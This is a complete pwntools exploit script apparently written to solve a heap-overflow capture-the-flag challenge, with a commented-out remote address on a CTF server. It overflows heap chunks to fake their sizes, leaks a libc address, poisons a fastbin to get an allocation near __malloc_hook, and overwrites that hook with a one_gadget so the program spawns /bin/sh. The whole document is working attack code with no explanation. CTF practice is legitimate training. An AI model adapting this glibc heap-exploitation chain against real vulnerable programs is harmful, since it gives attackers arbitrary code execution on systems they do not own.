from pwn import *
from LibcSearcher import *
from config import root,port,host,arch,OS
from utils import ROPgadget
context(arch=arch,os=OS)
def ru(x): return io.recvuntil(x)
def rl(): io.recvline()
def sla(x, y): io.sendlineafter(x, y)
def sl(x): io.sendline(x)
def psize(x): return p64(x)
def shell(): io.interactive()
# context.log_level = 'debug'
# 1. ret
# 2. io payload

def allocate(size):
    sla(b': ',b'1')
    sla(b': ',bytes(str(size),encoding='utf-8'))

def fill(id,len,payload):
    id = bytes(str(id),encoding='utf-8')
    len = bytes(str(len),encoding='utf-8')

    sla(b': ',b'2')
    sla(b': ',id)
    sla(b': ',len)
    sla(b': ',payload)

def free(id):
    id = bytes(str(id),encoding='utf-8')
    sla(b': ',b'3')
    sla(b': ',id)

def dump(id):
    id = bytes(str(id),encoding='utf-8')
    sla(b': ',b'4')
    sla(b': ',id)

def exit():
    sla(b': ',b'5')

# io = remote('node4.buuoj.cn', 26853)
io = process(root)
elf = ELF(root)

def main():
    allocate(0x80) # 0 
    allocate(0x80) # 1
    allocate(0x80) # 2
    allocate(0x80) # 3
    free(1)
    payload = b'a'*0x88 + p64(0x121)
    fill(0,len(payload),payload)
    allocate(0x110) # 1
    payload = b'a'*0x88 + p64(0x91)
    fill(1,len(payload),payload)
    free(2) 
    dump(1) 
    malloc_hook = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) -88 -0x10
    func_name = '__malloc_hook'
    print(hex(malloc_hook))
    obj = LibcSearcher(func_name,malloc_hook)
    libc_base = malloc_hook - obj.dump(func_name)  # libc_base_addr


    allocate(0x80) # 2
    allocate(0x60) # 4
    allocate(0x60) # 5

    free(5)

    payload = b'a'*0x68 + p64(0x71) + p64(malloc_hook-0x23)
    fill(4,len(payload),payload)
    allocate(0x60) # 5
    allocate(0x60) # 6(malloc_hook - 0x23)

    gg = libc_base + 0x4527a # execve("/bin/sh", rsp+0x30, environ)
    payload = b'a'*0x13 + p64(gg)
    fill(6,len(payload),payload)
    allocate(0x10)
    shell() 
if __name__ == "__main__":
    main()